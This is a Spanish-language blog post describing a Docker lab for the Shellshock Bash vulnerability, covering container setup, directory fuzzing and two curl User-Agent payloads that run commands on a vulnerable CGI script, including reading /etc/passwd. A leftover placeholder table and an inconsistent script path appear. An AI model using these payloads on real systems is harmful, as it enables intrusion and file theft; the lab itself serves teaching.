---
layout: single
title:  Explotando la vulnerabilidad shellshock en un entorno controlado
excerpt: "En este post mostraré como crear un pequeño laboratorio a traves de docker sobre la vulnerabilidad de shellshock hasta ganar acceso al sistema"
date: 2021-05-09
classes: wide
header:
    teaser: /assets/images/shellshock/portada.PNG
    teaser_home_page: true
categories:
    - BoF
tags:
    - linux
    - docker
---


<p align="center">
<img src="/assets/images/shellshock/portada.PNG">
</p>

- [Requisitos del laboratorio](#requisitos-del-laboratorio)
- [Laboratorio](#laboratorio)
- [Construyendo el Dockerfile](#construyendo-el-dockerfile)
- [Obteniendo una shell](#obteniendo-una-shell)

## Requisitos del laboratorio
- Maquina virtual Parrot OS
- Docker 
- Git 

## Shellshock ¿Que es?
Shellshock , también conocido como Bashdoor , es una familia de errores de seguridad de la familia Bash Unix.
Esta vulnerabilidad existe desde hace un tiempo, pero debido a la ubicuidad de las máquinas Unix conectadas a la web, Shellshock sigue siendo una amenaza muy real, especialmente para los sistemas sin parches.
Bash es un intérprete o intérprete que permite ejecutar comandos en un sistema, normalmente a través de una ventana de texto. Por lo general, es el shell predeterminado en los sistemas Unix y, como tal, se puede encontrar en Linux, macOS y otras variantes de Unix. Esta es la razón por la que Shellshock es tan severo: más de la mitad de los servidores web en Internet ejecutan Unix.

----

# Laboratorio
Para replicar esta vulnerabilidad en nuestro sistema es necesario descargar este [proyecto](https://github.com/Zenithar/docker-shellshockable) el cual viene un archivo Dockerfile que construiremos con docker para hacer nuestra práctica
```
git clone https://github.com/Zenithar/docker-shellshockable
```
<p align="center">
<img src="/assets/images/shellshock/1.PNG">
  </p>

## Contruyendo el Dockerfile
Teniendo ya el repositorio en nuestra maquina aplicaremos el siguiente comando como el usuario root.
```bash
sudo docker build -t shellshock docker-shellshockable
```
<p align="center">
<img src="/assets/images/shellshock/2.PNG">
  </p>

Listamos las todas las imagenes para verificar la construccion de la imagen shellshock.  
Y posteriormente corremos el contenedor
<p align="center">
<img src="/assets/images/shellshock/3.PNG">
  </p>

----

Con el comando ```ifconfig docker0``` comprobaremos en que segmento de red se encuentra el contenedor.
<p align="center">
<img src="/assets/images/shellshock/4.PNG">
  </p>


Se puede observar que la ip en el que se esta ejecutando el servicio web es la 172.17.0.2
<p align="center">
<img src="/assets/images/shellshock/5.PNG">
  </p>


Si nos dirigimos al navegador nos muestra la pagina por defecto de apache.
<p align="center">
<img src="/assets/images/shellshock/6.PNG">
  </p>


Aplicaremos fuzzing a la pagina web para ver que con cosas interesantes nos podemos topar para ello haré uso de la utilidad de dirsearch que lo puedes descargar de [aquí](https://github.com/maurosoria/dirsearch).
|columna 1 | columan 2 | columna 3 |
|----------|:----------|:----------|
|fila1     |elemento 1 |manzana    |
|fila2     |elemento 2 |pera       |
|fila3     |elemento 3 |granadilla |

<p align="center">
<img src="/assets/images/shellshock/7.PNG">
  </p>

Si verificamos este directopio en la web nos manda un mensaje de que no tenemos acceso, sin embargo sabemos que existe asi que volveremos a aplicar fuzzing a esta ruta nueva.
<p align="center">
<img src="/assets/images/shellshock/8.PNG">
  </p>

Ha sido posible encontrar la ruta **/cgi-bin/sockme.cgi**.
<p align="center">
<img src="/assets/images/shellshock/9.PNG">
  </p>

El siguiente comando de POC es posible obtener ejecución remota de comandos dentro del servidor.
```bash
curl -A "() { foo;};echo;/bin/cat /etc/passwd" "http://172.17.0.2/cgi-bin/shockme.cgi"

```
<p align="center">
<img src="/assets/images/shellshock/10.PNG">
  </p>

## Obteniendo una shell
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" "http://172.17.0.2/cgi-bin/shockme.cgi"
```
<p align="center">
<img src="/assets/images/shellshock/11.PNG">
  </p>






